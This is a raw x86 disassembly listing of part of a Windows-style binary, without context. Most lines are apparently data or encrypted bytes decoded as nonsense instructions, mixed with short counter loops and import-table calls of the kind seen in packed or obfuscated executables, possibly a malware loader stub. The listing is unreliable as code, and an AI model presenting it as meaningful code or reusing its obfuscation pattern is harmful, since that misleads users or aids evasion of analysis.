  4070c1:	outs   dx,BYTE PTR ds:[esi]
  4070c2:	sub    DWORD PTR [ebx],ebx
  4070c4:	push   esi
  4070c5:	pop    esp
  4070c6:	js     0x407095
  4070c8:	cmp    BYTE PTR [edi+0x6f],bh
  4070cb:	pop    ds
  4070cc:	xchg   DWORD PTR [esi],ecx
  4070ce:	rol    DWORD PTR [edx-0x3f],1
  4070d1:	ins    DWORD PTR es:[edi],dx
  4070d2:	fimul  WORD PTR [esi+ebp*2-0x64f3505b]
  4070d9:	mov    ecx,0xb8454a3c
  4070de:	imul   ebx,DWORD PTR [ecx],0x4fab7a0
  4070e4:	xchg   esp,eax
  4070e5:	mov    DWORD PTR [ebp-0x28],eax
  4070e8:	and    DWORD PTR ds:0x4335cf,0x274d
  4070f2:	mov    eax,DWORD PTR [ebp+0x8]
  4070f5:	mov    DWORD PTR [ebp-0x20],eax
  4070f8:	xor    ecx,ecx
  4070fa:	xor    ecx,DWORD PTR ds:0x433673
  407100:	add    ecx,DWORD PTR ds:0x4335c3
  407106:	mov    DWORD PTR ds:0x433673,ecx
  40710c:	jmp    0x407482
  407111:	ret    
  407112:	and    dl,dl
  407114:	paddw  mm5,mm1
  407117:	int    0xf0
  407119:	xchg   DWORD PTR [esi+0xb],edx
  40711c:	jmp    FWORD PTR [ebp-0x1b0338]
  407122:	iret   
  407123:	jl     0x4071a1
  407125:	xlat   BYTE PTR ds:[ebx]
  407126:	jns    0x4071a4
  407128:	jl     0x4070cd
  40712a:	mov    dl,0x45
  40712c:	jno    0x40714e
  40712e:	test   al,ch
  407130:	jmp    esi
  407132:	jno    0x40716f
  407134:	xchg   edi,eax
  407135:	pop    ebp
  407136:	inc    edx
  407137:	inc    edi
  407138:	mov    ebx,0xf20b05c
  40713d:	push   0xffffffb3
  40713f:	out    0x3d,al
  407141:	sub    eax,0xcb89a4fc
  407146:	jmp    0x8431:0x9e512dba
  40714d:	fcomp  st(7)
  40714f:	and    eax,0xc638e4a5
  407154:	sub    DWORD PTR [esi-0x56],edi
  407157:	sahf   
  407158:	gs push ebx
  40715a:	dec    esi
  40715b:	mov    eax,ds:0x9e975dd4
  407160:	jg     0x40715b
  407162:	mov    ds:0x624aeddc,al
  407167:	test   DWORD PTR ds:0xc5a7818a,esi
  40716d:	push   eax
  40716e:	pop    esi
  40716f:	cmp    dl,bl
  407171:	dec    ebp
  407172:	fisub  WORD PTR [edi]
  407174:	repnz mov ecx,0x76c63f1
  40717a:	(bad)  
  40717b:	cmc    
  40717c:	pop    ss
  40717d:	sahf   
  40717e:	inc    esp
  40717f:	stos   DWORD PTR es:[edi],eax
  407180:	or     DWORD PTR [edi+0x7d],eax
  407183:	jmp    0x8bf6:0x68a712b9
  40718a:	out    dx,eax
  40718b:	mov    bh,0xfe
  40718d:	mov    esi,0x92c5e8e4
  407192:	and    ah,ch
  407194:	jbe    0x4071e7
  407196:	or     al,bl
  407198:	xchg   ebx,eax
  407199:	stos   BYTE PTR es:[edi],al
  40719a:	rol    DWORD PTR [ecx],cl
  40719c:	scas   al,BYTE PTR es:[edi]
  40719d:	addr16 loope 0x40721d
  4071a0:	sbb    DWORD PTR [ebx+0x4a72de71],ebx
  4071a6:	and    DWORD PTR [edi+0x30d81e8a],ebp
  4071ac:	add    BYTE PTR [ebx+0xcb99a95],ch
  4071b2:	add    dl,BYTE PTR [edi+0x41]
  4071b5:	pop    ss
  4071b6:	mov    eax,0xed325e49
  4071bb:	xor    DWORD PTR [edi],edi
  4071bd:	bnd jle 0x407144
  4071c0:	stos   BYTE PTR es:[edi],al
  4071c1:	std    
  4071c2:	scas   al,BYTE PTR es:[edi]
  4071c3:	xchg   ebp,eax
  4071c4:	dec    ecx
  4071c5:	jbe    0x407175
  4071c7:	lods   al,BYTE PTR ds:[esi]
  4071c8:	xor    ecx,0xd27d3716
  4071ce:	fdiv   DWORD PTR [ebp-0x223a6493]
  4071d4:	dec    edi
  4071d5:	data16 int 0x2f
  4071d8:	(bad)  [eax]
  4071da:	or     ah,0x3f
  4071dd:	test   al,0x32
  4071df:	adc    DWORD PTR [edi-0xefcc401],0x2b
  4071e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4071e7:	stc    
  4071e8:	ss xor eax,0xf116219
  4071ee:	xchg   esp,eax
  4071ef:	aam    0x33
  4071f1:	dec    edx
  4071f2:	jbe    0x4071a8
  4071f4:	stos   DWORD PTR es:[edi],eax
  4071f5:	inc    ebx
  4071f6:	std    
  4071f7:	gs inc edx
  4071f9:	outs   dx,DWORD PTR ds:[esi]
  4071fa:	dec    edx
  4071fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4071fc:	call   0x3805:0x2f1c4f65
  407203:	getsec 
  407205:	add    DWORD PTR [ebx-0x4e],edx
  407208:	adc    esp,DWORD PTR [ebx+0x7e]
  40720b:	icebp  
  40720c:	scas   eax,DWORD PTR es:[edi]
  40720d:	pop    ecx
  40720e:	enter  0x54b6,0xc5
  407212:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407213:	pop    ds
  407214:	into   
  407215:	adc    BYTE PTR [eax+ebp*8],cl
  407218:	lods   eax,DWORD PTR ds:[esi]
  407219:	shr    eax,0xf5
  40721c:	pop    edi
  40721d:	adc    dh,BYTE PTR [ebx+0x56f041a8]
  407223:	jge    0x407240
  407225:	dec    ebp
  407226:	jp     0x40721b
  407228:	xchg   ch,ah
  40722a:	inc    esp
  40722b:	shr    eax,1
  40722d:	lods   al,BYTE PTR ds:[esi]
  40722e:	inc    ax
  407230:	pop    eax
  407231:	int    0xff
  407233:	and    DWORD PTR [ecx-0x56],0x23
  407237:	adc    BYTE PTR [edi],dl
  407239:	repnz cdq 
  40723b:	push   edx
  40723c:	jo     0x407288
  40723e:	push   ebp
  40723f:	mov    ebx,0x9ffd4d04
  407244:	pusha  
  407245:	enter  0x3208,0x6f
  407249:	ja     0x4072b2
  40724b:	push   esp
  40724c:	push   ds
  40724d:	test   al,0xb9
  40724f:	test   eax,0xde16d9a3
  407254:	out    0x75,al
  407256:	add    BYTE PTR [eax-0xe],al
  407259:	and    eax,0xd982a192
  40725e:	popf   
  40725f:	mov    edi,DWORD PTR [ebx+edi*4]
  407262:	pop    esp
  407263:	mov    ds:0x2ec86b5,eax
  407268:	shr    BYTE PTR [ebp+0x56],cl
  40726b:	or     eax,DWORD PTR [eax]
  40726d:	add    eax,0x1f265c93
  407272:	inc    esi
  407273:	jb     0x40720a
  407275:	xor    ah,al
  407277:	and    al,0x82
  407279:	jno    0x40723e
  40727b:	or     BYTE PTR [ebp+0x7f],dl
  40727e:	addr16 into 
  407280:	mov    ds:0xda8d4b2f,al
  407285:	sub    ebp,ebx
  407287:	ret    
  407288:	xchg   ecx,eax
  407289:	mov    ecx,0x402e6fa6
  40728e:	inc    edx
  40728f:	outs   dx,BYTE PTR ds:[esi]
  407290:	in     al,dx
  407291:	dec    ebp
  407292:	icebp  
  407293:	retf   
  407294:	mov    dh,0xeb
  407296:	ds dec ecx
  407298:	push   esp
  407299:	push   es
  40729a:	push   edx
  40729b:	mov    WORD PTR [eax+ecx*4+0x58],fs
  40729f:	(bad)  [edx-0x2c3e2d83]
  4072a5:	repnz sub al,0x71
  4072a8:	push   ss
  4072a9:	mov    esp,0x63999df7
  4072ae:	pop    eax
  4072af:	loopne 0x4072d6
  4072b1:	add    al,0xb0
  4072b3:	jb     0x4072a3
  4072b5:	sub    ah,bl
  4072b7:	lea    ecx,[ebx-0x6b]
  4072ba:	pop    edx
  4072bb:	xor    DWORD PTR [ebx+0x25e72f54],0x501d6f91
  4072c5:	pop    esp
  4072c6:	push   ds
  4072c7:	mov    ds:0x48d594d5,al
  4072cc:	pop    ss
  4072cd:	cs mov dh,0x84
  4072d0:	lods   eax,DWORD PTR ds:[esi]
  4072d1:	mov    ebx,0x6ce9d5e9
  4072d6:	ficomp WORD PTR [ebx-0x24]
  4072d9:	or     BYTE PTR [edx+0x26],0x6f
  4072dd:	jne    0x4072bd
  4072df:	stos   DWORD PTR es:[edi],eax
  4072e0:	sbb    eax,0x5d48fabf
  4072e5:	or     ah,BYTE PTR [edi]
  4072e7:	xlat   BYTE PTR ds:[ebx]
  4072e8:	jg     0x407321
  4072ea:	xor    DWORD PTR [ecx+0x264d668],ecx
  4072f0:	xor    eax,0x45656ab9
  4072f5:	aad    0x55
  4072f7:	repnz mov esp,0x7623de4b
  4072fd:	inc    ebx
  4072fe:	aad    0x33
  407300:	fist   WORD PTR [edi+0x71]
  407303:	mov    ch,0x94
  407305:	sbb    al,0x29
  407307:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407308:	fisubr DWORD PTR [ecx]
  40730a:	jmp    0x4072c9
  40730c:	jno    0x407375
  40730e:	push   0x94fe8574
  407313:	es shr al,1
  407316:	add    DWORD PTR [edx-0x5cc057c0],edx
  40731c:	dec    ecx
  40731d:	outs   dx,DWORD PTR ds:[esi]
  40731e:	pop    ebp
  40731f:	hlt    
  407320:	mov    ebp,0xf0d710cd
  407325:	xchg   DWORD PTR [eax-0x4e],ebp
  407328:	mov    al,ds:0xae010d75
  40732d:	sub    ah,BYTE PTR ss:[edi+ebx*2-0x65]
  407332:	ret    0xfbc6
  407335:	cld    
  407336:	std    
  407337:	pop    esi
  407338:	sbb    BYTE PTR [esp+eax*4-0x73f1794c],bh
  40733f:	and    BYTE PTR [eax],0x49
  407342:	sbb    ebx,DWORD PTR [ecx-0x763df22]
  407348:	in     eax,dx
  407349:	adc    ch,dl
  40734b:	imul   ebp,DWORD PTR [eax-0xcb56990],0xffffffed
  407352:	lods   al,BYTE PTR ds:[esi]
  407353:	cmp    BYTE PTR [eax-0x4505ab88],ch
  407359:	jno    0x40735b
  40735b:	je     0x4073b7
  40735d:	shr    BYTE PTR [ebp-0x1],1
  407360:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407361:	add    cl,BYTE PTR [ebx-0x23]
  407364:	mov    dh,0x2f
  407366:	xchg   ecx,eax
  407367:	xchg   cl,ah
  407369:	and    BYTE PTR [edx+0x24016f6c],ah
  40736f:	loopne 0x407383
  407371:	jno    0x4073ca
  407373:	sti    
  407374:	fcmovu st,st(5)
  407376:	jae    0x40739c
  407378:	dec    edx
  407379:	push   esi
  40737a:	mov    cl,0x6f
  40737c:	into   
  40737d:	pop    esi
  40737e:	out    0x7b,al
  407380:	mov    cl,0xd9
  407382:	jbe    0x4073a1
  407384:	ret    
  407385:	out    0x3b,eax
  407387:	sub    eax,0xa2a11241
  40738c:	mov    ch,0x7a
  40738e:	pop    ds
  40738f:	lods   eax,DWORD PTR ds:[esi]
  407390:	push   es
  407391:	pcmpgtd mm1,QWORD PTR [eax-0x25]
  407395:	pusha  
  407396:	repz push 0xbac087a2
  40739c:	mov    esp,0x91ab5967
  4073a1:	pop    ds
  4073a2:	inc    edi
  4073a3:	dec    edi
  4073a4:	pop    esp
  4073a5:	pop    esp
  4073a6:	aaa    
  4073a7:	cmp    al,0x7a
  4073a9:	ins    BYTE PTR es:[edi],dx
  4073aa:	inc    eax
  4073ab:	rcl    BYTE PTR [edx+0x8acaf8c],1
  4073b1:	ins    BYTE PTR es:[edi],dx
  4073b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073b3:	aad    0xbd
  4073b5:	scas   eax,DWORD PTR es:[edi]
  4073b6:	sar    ebx,cl
  4073b8:	xor    eax,0x7bb3ede4
  4073bd:	dec    edx
  4073be:	pushaw 
  4073c0:	sbb    DWORD PTR [ebx],ecx
  4073c2:	out    dx,al
  4073c3:	mov    ebp,0xfe5d6091
  4073c8:	xor    bh,BYTE PTR [edi]
  4073ca:	ror    esp,cl
  4073cc:	pop    eax
  4073cd:	lock sub BYTE PTR [edx+0x1cc343f],0xc9
  4073d5:	div    BYTE PTR [esi]
  4073d7:	loop   0x407392
  4073d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4073da:	cmc    
  4073db:	or     ch,BYTE PTR [esi-0x123e0394]
  4073e1:	mov    ebp,0x4506437c
  4073e6:	xlat   BYTE PTR ds:[ebx]
  4073e7:	or     eax,0x7d7e62e
  4073ec:	fs loope 0x4073b6
  4073ef:	pop    ds
  4073f0:	push   ss
  4073f1:	outs   dx,DWORD PTR ds:[esi]
  4073f2:	loop   0x40740d
  4073f4:	push   eax
  4073f5:	mov    ds:0xc811772b,eax
  4073fa:	sbb    BYTE PTR [esi+0x13],0xa5
  4073fe:	sub    al,0x3d
  407400:	loopne 0x407481
  407402:	and    BYTE PTR [ebp+0x35],ah
  407405:	mov    ch,0xf7
  407407:	sbb    eax,0xf6c50df5
  40740c:	mov    WORD PTR [esp+eax*1+0x4aed7991],?
  407413:	lods   al,BYTE PTR ds:[esi]
  407414:	call   0x12f9:0x82f48492
  40741b:	mov    bh,0x8f
  40741d:	xor    edi,DWORD PTR [edi+ebp*4]
  407420:	pop    ecx
  407421:	mov    bh,0x9a
  407423:	and    DWORD PTR [ebx],eax
  407425:	and    BYTE PTR [edx],0x9f
  407428:	hlt    
  407429:	xor    ebx,DWORD PTR [edx]
  40742b:	je     0x40744b
  40742d:	test   BYTE PTR [edi-0xa],ch
  407430:	sub    al,0xdc
  407432:	stos   BYTE PTR es:[edi],al
  407433:	ins    BYTE PTR es:[edi],dx
  407434:	ss sub al,0xb8
  407437:	fisttp DWORD PTR [ecx]
  407439:	addr16 clc 
  40743b:	test   al,0x1a
  40743d:	or     al,cl
  40743f:	push   esi
  407440:	mov    ah,0xa2
  407442:	mov    bl,0x27
  407444:	pop    ss
  407445:	add    BYTE PTR [ebx-0x43],dh
  407448:	hlt    
  407449:	pop    DWORD PTR [ebp-0x6f]
  40744c:	xor    ebp,DWORD PTR [edx-0x3d]
  40744f:	(bad)  
  407450:	sub    DWORD PTR ds:0x97e64627,esi
  407456:	sub    eax,0xa7e03e4
  40745b:	aam    0xb8
  40745d:	cmp    al,0x63
  40745f:	pop    ss
  407460:	push   ecx
  407461:	sar    ch,1
  407463:	jge    0x4074c0
  407465:	pop    es
  407466:	cmp    edx,DWORD PTR [ebx]
  407468:	pop    edx
  407469:	cmp    eax,DWORD PTR [edi]
  40746b:	stos   BYTE PTR es:[edi],al
  40746c:	sbb    BYTE PTR [ebp-0x7d],bh
  40746f:	das    
  407470:	js     0x407436
  407472:	pop    ebx
  407473:	xor    eax,0xbf623d17
  407478:	add    dl,dl
  40747a:	push   0x73
  40747c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40747d:	pop    ebx
  40747e:	jbe    0x4074d1
  407480:	jbe    0x4074f7
  407482:	push   ebx
  407483:	mov    DWORD PTR ds:0x433617,0x17
  40748d:	cmp    DWORD PTR ds:0x433617,0x0
  407494:	je     0x4074de
  40749a:	cmp    DWORD PTR ds:0x433617,0xc
  4074a1:	jne    0x4074b2
  4074a7:	push   0x26d7
  4074ac:	call   DWORD PTR ds:0x41218c
  4074b2:	cmp    DWORD PTR ds:0x433617,0xd
  4074b9:	jne    0x4074cc
  4074bf:	mov    ecx,DWORD PTR ds:0x433617
  4074c5:	dec    ecx
  4074c6:	mov    DWORD PTR ds:0x433617,ecx
  4074cc:	mov    ecx,DWORD PTR ds:0x433617
  4074d2:	dec    ecx
  4074d3:	mov    DWORD PTR ds:0x433617,ecx
  4074d9:	jmp    0x40748d
  4074de:	lea    eax,[ebp-0x18]
  4074e1:	not    DWORD PTR ds:0x43362b
  4074e7:	mov    DWORD PTR [ebp-0x1c],eax
  4074ea:	add    DWORD PTR ds:0x43362b,ecx
  4074f0:	jmp    0x407866
  4074f5:	xchg   esi,eax
  4074f6:	je     0x407544
  4074f8:	cwde   
  4074f9:	outs   dx,BYTE PTR ds:[esi]
  4074fa:	mov    al,ds:0x62ca7272
  4074ff:	mov    cl,0xe2
  407501:	pop    esi
  407502:	call   0x7c7c:0xc8568e1c
  407509:	xlat   BYTE PTR ds:[ebx]
  40750a:	jns    0x407588
  40750c:	jl     0x407577
  40750e:	dec    ecx
  40750f:	test   edx,0x38b134c3
  407515:	mov    ecx,0x6861f041
  40751a:	sub    DWORD PTR [ebx-0x61f82a58],0x66
  407521:	pop    ds
  407522:	mov    cl,0x90
  407524:	cld    
  407525:	leave  
  407526:	cmp    ecx,DWORD PTR [edi]
  407528:	inc    ebx
  407529:	and    eax,0xb19497e6
  40752e:	outs   dx,BYTE PTR ds:[esi]
  40752f:	push   esi
  407530:	fidiv  DWORD PTR es:[ebp+esi*1+0x5dfe1e0e]
  407538:	pop    ebp
  407539:	loopne 0x4074db
  40753b:	dec    esp
  40753c:	inc    ebx
  40753d:	xor    eax,0x250e01de
  407542:	push   ecx
  407543:	xchg   edi,eax
  407544:	outs   dx,BYTE PTR ds:[esi]
  407545:	jo     0x40758e
  407547:	call   DWORD PTR [edx-0x79228321]
  40754d:	mov    cl,BYTE PTR [eax-0x4d]
  407550:	(bad)  
  407552:	push   cs
  407553:	inc    edi
  407554:	and    al,dh
  407556:	stc    
  407557:	or     eax,0xbeb5d51a
  40755c:	pop    edx
  40755d:	in     eax,dx
  40755e:	and    bh,BYTE PTR [edx-0x21420778]
  407564:	sbb    eax,0x17befe96
  407569:	mov    esi,0xfbbdadbf
  40756e:	rcr    DWORD PTR [edx+0x745a274c],cl
  407574:	cdq    
  407575:	gs fcmovb st,st(5)
  407578:	add    al,0xb7
  40757a:	inc    ebp
  40757b:	loope  0x40759e
  40757d:	ja     0x4075bc
  40757f:	mov    ah,0xdf
  407581:	jl     0x407538
  407583:	xor    al,0xac
  407585:	(bad)  
  407586:	mov    dh,0x27
  407588:	adc    eax,DWORD PTR [ecx-0x23]
  40758b:	inc    esp
  40758c:	pop    es
  40758d:	or     eax,0x2a8455a5
  407592:	and    eax,0x5a1ac4ed
  407597:	push   0x4c
  407599:	in     eax,dx
  40759a:	icebp  
  40759b:	inc    ecx
  40759c:	sub    BYTE PTR [edi+0x394cc895],dl
  4075a2:	nop
  4075a3:	scas   eax,DWORD PTR es:[edi]
  4075a4:	into   
  4075a5:	xchg   BYTE PTR ds:0x45b9e882,ah
  4075ab:	add    eax,0x6298fe7f
  4075b0:	jae    0x407626
  4075b2:	sbb    DWORD PTR [esi],eax
  4075b4:	pop    ebp
  4075b5:	mov    bl,0xaf
  4075b7:	out    0x50,al
  4075b9:	inc    ebx
  4075ba:	jp     0x407607
  4075bc:	mov    DWORD PTR [edx+0x3f],edx
  4075bf:	cdq    
  4075c0:	call   0x400da237
  4075c5:	fsub   DWORD PTR [ebx-0x346fb886]
  4075cb:	mov    ch,0xc3
  4075cd:	jle    0x40757e
  4075cf:	inc    ecx
  4075d0:	stos   BYTE PTR es:[edi],al
  4075d1:	pop    esi
  4075d2:	rcl    DWORD PTR [ecx+0x41],0x64
  4075d6:	ret    
  4075d7:	pop    ss
  4075d8:	xor    ah,BYTE PTR [ebp-0x6c48be43]
  4075de:	sbb    ebp,DWORD PTR [eax+0x2ec4e18f]
  4075e4:	jnp    0x40758e
  4075e6:	out    0x84,al
  4075e8:	jmp    DWORD PTR [eax]
  4075ea:	nop
  4075eb:	jb     0x407643
  4075ed:	shl    ebp,0x32
  4075f0:	hlt    
  4075f1:	add    ebx,DWORD PTR [ecx]
  4075f3:	ret    0xc1fe
  4075f6:	inc    edx
  4075f7:	shl    BYTE PTR [edx+ecx*4+0x72b4659c],0xca
  4075ff:	jge    0x4075a8
  407601:	add    al,0x81
  407603:	fdiv   DWORD PTR [ecx+0x1997672c]
  407609:	out    0x44,al
  40760b:	fbstp  TBYTE PTR [ebx+0x3630faf0]
  407611:	popf   
  407612:	shl    DWORD PTR [edx+0x3b6f63a],0xf4
  407619:	xchg   ecx,eax
  40761a:	and    eax,0x65c2c416
  40761f:	dec    edx
  407620:	pop    ebp
  407621:	pop    ecx
  407622:	cmp    bh,BYTE PTR ds:0xbe9edec7
  407628:	mov    edi,DWORD PTR ds:0x66ee261a
  40762e:	popa   
  40762f:	pop    ecx
  407630:	inc    eax
  407631:	add    BYTE PTR [edx-0x769e8cb7],ch
  407637:	in     al,0xc3
  407639:	xchg   ebp,eax
  40763a:	addr16 call 0xf226:0xf1fe66c2
  407642:	loope  0x4076c3
  407644:	jmp    0xb3c8:0x25d28864
  40764b:	jmp    0x5be0:0x759336ca
  407652:	xor    bh,BYTE PTR [esi+0x572ffbe3]
  407658:	ja     0x407610
  40765a:	push   eax
  40765b:	(bad)  
  40765c:	out    dx,al
  40765d:	adc    al,0x94
  40765f:	add    eax,0x9fac9e55
  407664:	mov    al,0x93
  407666:	shr    DWORD PTR [edx-0x5a6604de],1
  40766c:	outs   dx,BYTE PTR ds:[esi]
  40766d:	shr    BYTE PTR [ebx],0x29
  407670:	xchg   ebx,eax
  407671:	lods   eax,DWORD PTR ds:[esi]
  407672:	mov    al,0xee
  407674:	pop    ebx
  407675:	cmc    
  407676:	mov    ch,0x60
  407678:	hlt    
  407679:	mov    ebx,0xce5b965c
  40767e:	dec    ecx
  40767f:	stos   BYTE PTR es:[edi],al
  407680:	int    0xc9
  407682:	jo     0x4076d6
  407684:	cmp    ah,BYTE PTR [esp+ebp*1+0x39]
  407688:	mov    ds:0x4a146694,al
  40768d:	mov    dh,0x59
  40768f:	jg     0x4076d6
  407691:	or     BYTE PTR [ebx],bl
  407693:	retf   0x7a16
  407696:	push   ebp
  407697:	in     al,dx
  407698:	lods   al,BYTE PTR ds:[esi]
  407699:	jb     0x40768b
  40769b:	adc    al,0x7d
  40769d:	stos   BYTE PTR es:[edi],al
  40769e:	cmp    BYTE PTR [ecx],0x58
  4076a1:	mov    dh,0xf5
  4076a3:	cwde   
  4076a4:	call   0xe61eb7e1
  4076a9:	cmp    al,0x39
  4076ab:	pop    ebx
  4076ac:	add    BYTE PTR [ebp+0x7a],al
  4076af:	mov    ebx,0xccc6c62d
  4076b4:	call   0x353cc718
  4076b9:	mov    al,0xf0
  4076bb:	rcr    BYTE PTR [esi-0x15667b28],0xb8
  4076c2:	push   ss
  4076c3:	loop   0x4076ce
  4076c5:	int3   
  4076c6:	test   esp,ebx
  4076c8:	xchg   DWORD PTR [ebx-0x2d],ebx
  4076cb:	pop    es
  4076cc:	dec    esp
  4076cd:	cmp    ebx,edx
  4076cf:	xchg   ebx,eax
  4076d0:	lea    edi,[ebx+0x48]
  4076d3:	pop    es
  4076d4:	loopne 0x407731
  4076d6:	xchg   ebp,eax
  4076d7:	repnz inc ebx
  4076d9:	mov    bh,0xc8
  4076db:	ss jle 0x407735
  4076de:	sub    eax,DWORD PTR [esi+0x6a]
  4076e1:	mov    esp,0x4a058362
  4076e6:	add    DWORD PTR [edx+0x4b],ebx
  4076e9:	aas    
  4076ea:	and    eax,0x3b40a045
  4076ef:	adc    bh,cl
  4076f1:	pop    edx
  4076f2:	sbb    ebx,DWORD PTR [ebx+0x6ecd3314]
  4076f8:	fld    TBYTE PTR [ecx-0x46]
  4076fb:	jmp    0xd0e1:0x39a53341
  407702:	mov    al,BYTE PTR [ecx]
  407704:	gs cmp bl,bh
  407707:	pop    esi
  407708:	sub    cl,BYTE PTR [eax-0x33]
  40770b:	push   0x33e18af1
  407710:	mov    esi,0xb17113a5
  407715:	mov    ch,0x81
  407717:	jle    0x40776b
  407719:	sub    eax,0x66e28a25
  40771e:	xchg   ebx,eax
  40771f:	js     0x407750
  407721:	loopne 0x4076b6
  407723:	inc    eax
  407724:	inc    ecx
  407725:	inc    edx
  407726:	(bad)  
  407728:	mov    cl,0x3c
  40772a:	cmp    ch,BYTE PTR [esi-0x4440d02b]
  407730:	out    0x7e,al
  407732:	jns    0x4076e7
  407734:	inc    edx
  407735:	test   BYTE PTR [esi+0x30bef4f3],ah
  40773b:	dec    esp
  40773c:	sbb    BYTE PTR [eax],cl
  40773e:	ja     0x4077a9
  407740:	ins    BYTE PTR es:[edi],dx
  407741:	and    edx,DWORD PTR ds:[edx-0x36c92b66]
  407748:	sti    
  407749:	and    dh,BYTE PTR [ebx]
  40774b:	jl     0x40771f
  40774d:	xchg   edi,eax
  40774e:	xlat   BYTE PTR ds:[ebx]
  40774f:	ds retf 
  407751:	push   edi
  407752:	adc    al,0x2e
  407754:	cdq    
  407755:	in     eax,0xdc
  407757:	(bad)  
  407758:	retf   
  407759:	and    al,0xb1
  40775b:	ds mov eax,0xd1b3bffe
  407761:	pop    ds
  407762:	das    
  407763:	jmp    0x4077d3
  407765:	rol    eax,1
  407767:	dec    ecx
  407768:	jns    0x407750
  40776a:	das    
  40776b:	iret   
  40776c:	adc    edx,ecx
  40776e:	retf   0x5f81
  407771:	fdivp  st(3),st
  407773:	(bad)  
  407774:	mov    dl,0xa
  407776:	popf   
  407777:	jmp    0x40778b
  407779:	dec    cl
  40777b:	xlat   BYTE PTR ds:[ebx]
  40777c:	loope  0x40778c
  40777e:	arpl   WORD PTR [ebx-0x1952a02c],bp
  407784:	inc    edi
  407785:	(bad)
  407788:	pfnacc mm3,QWORD PTR [esi+0x66]
  40778d:	daa    
  40778e:	ins    BYTE PTR es:[edi],dx
  40778f:	and    dh,BYTE PTR [ecx-0x46]
  407792:	neg    DWORD PTR [edi-0x13dcf75]
  407798:	outs   dx,BYTE PTR ds:[esi]
  407799:	mov    ebx,DWORD PTR [ebx-0x500c2bee]
  40779f:	cs in  eax,0xdd
  4077a2:	lock test DWORD PTR [esi-0x48],esp
  4077a6:	jg     0x407771
  4077a8:	add    esi,DWORD PTR [edx]
  4077aa:	repnz fcomip st,st(4)
  4077ad:	mov    gs,WORD PTR [edx-0x5a09b610]
  4077b3:	pop    eax
  4077b4:	(bad)  
  4077b6:	sbb    al,0x57
  4077b8:	add    DWORD PTR [edx+0x79],esi
  4077bb:	xchg   edx,eax
  4077bc:	bound  ecx,QWORD PTR [ebx-0x21b007c7]
  4077c2:	dec    eax
  4077c3:	pop    esp
  4077c4:	into   
  4077c5:	pusha  
  4077c6:	mov    ds:0xee69eae2,al
  4077cb:	push   edx
  4077cc:	sahf   
  4077cd:	jno    0x4077d5
  4077cf:	gs jge 0x407781
  4077d2:	aas    
  4077d3:	xchg   DWORD PTR [edi+0x55870cd],edi
  4077d9:	pop    ds
  4077da:	and    eax,0x1466c2e8
  4077df:	pop    ss
  4077e0:	mov    ds:0x639e421b,al
  4077e5:	or     eax,0x4b2d7137
  4077ea:	fwait
  4077eb:	pusha  
  4077ec:	lahf   
  4077ed:	nop
  4077ee:	and    bh,dh
  4077f0:	fs pop edx
  4077f2:	pop    esp
  4077f3:	outs   dx,BYTE PTR ds:[esi]
  4077f4:	bound  ebp,QWORD PTR [ecx]
  4077f6:	mov    dl,0xf3
  4077f8:	hlt    
  4077f9:	(bad)  
  4077fa:	aam    0xe7
  4077fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4077fd:	sub    eax,0x730471ce
  407802:	adc    eax,0xeaec5bcc
  407807:	fist   DWORD PTR [ecx+esi*8-0x407c4812]
  40780e:	mov    ah,0xae
  407810:	fwait
  407811:	mov    al,0x51
  407813:	icebp  
  407814:	pop    edi
  407815:	or     al,0xed
  407817:	out    0x16,al
  407819:	fild   DWORD PTR [esi]
  40781b:	xor    DWORD PTR [ebx],edx
  40781d:	imul   ebx,DWORD PTR fs:[esi],0x29
  407821:	pop    es
  407822:	pop    edx
  407823:	push   eax
  407824:	das    
  407825:	(bad)  
  407827:	push   esp
  407828:	xchg   ebp,eax
  407829:	stos   BYTE PTR es:[edi],al
  40782a:	sub    eax,0x95fadab1
  40782f:	or     dh,BYTE PTR [ebx-0x6b]
  407832:	sar    DWORD PTR [edx-0x2152a08f],cl
  407838:	push   ebp
  407839:	lods   eax,DWORD PTR ds:[esi]
  40783a:	or     BYTE PTR [edx-0x6cc3c563],0x5b
  407841:	cld    
  407842:	lock mov ah,0xe1
  407845:	les    edx,FWORD PTR [ebp-0x1e829c6f]
  40784b:	sbb    al,0x85
  40784d:	test   DWORD PTR [ecx-0x5a1cb2ba],ebx
  407853:	xor    DWORD PTR [esi+0x69],ebp
  407856:	test   eax,0x9df3ecd1
  40785b:	pop    esp
  40785c:	jle    0x4078be
  40785e:	out    0xcc,eax
  407860:	rol    dl,cl
  407862:	sbb    eax,0x8b38ed40
  407867:	inc    ebp
  407868:	in     al,0x81
  40786a:	and    eax,0x433697
  40786f:	add    BYTE PTR [eax],al
  407871:	add    BYTE PTR [eax],al
  407873:	mov    ebx,DWORD PTR ds:0x433697
  407879:	inc    ebx
  40787a:	mov    DWORD PTR ds:0x433697,ebx
  407880:	cmp    DWORD PTR ds:0x433697,0x6
  407887:	jne    0x407896
  40788d:	push   DWORD PTR [ebp-0x28]
  407890:	call   DWORD PTR ds:0x412190
  407896:	cmp    DWORD PTR ds:0x433697,0x5
  40789d:	jne    0x4078b0
  4078a3:	mov    ebx,DWORD PTR ds:0x433697
  4078a9:	inc    ebx
  4078aa:	mov    DWORD PTR ds:0x433697,ebx
  4078b0:	cmp    DWORD PTR ds:0x433697,0x15
  4078b7:	jb     0x407873
  4078bd:	push   esi
  4078be:	and    DWORD PTR ds:0x4335cb,edi
  4078c4:	push   edi
  4078c5:	and    DWORD PTR ds:0x43366b,0x0
  4078cf:	jmp    0x4078e1
  4078d4:	mov    edi,DWORD PTR ds:0x43366b
  4078da:	inc    edi
  4078db:	mov    DWORD PTR ds:0x43366b,edi
  4078e1:	cmp    DWORD PTR ds:0x43366b,0x18
  4078e8:	jae    0x4079ae
  4078ee:	cmp    DWORD PTR ds:0x43366b,0x8
  4078f5:	jne    0x407918
  4078fb:	push   0x117a
  407900:	push   DWORD PTR [ebp-0x28]
  407903:	push   0x433894
  407908:	push   0x86e1
  40790d:	push   0x5408
  407912:	call   DWORD PTR ds:0x41225c
  407918:	cmp    DWORD PTR ds:0x43366b,0x7
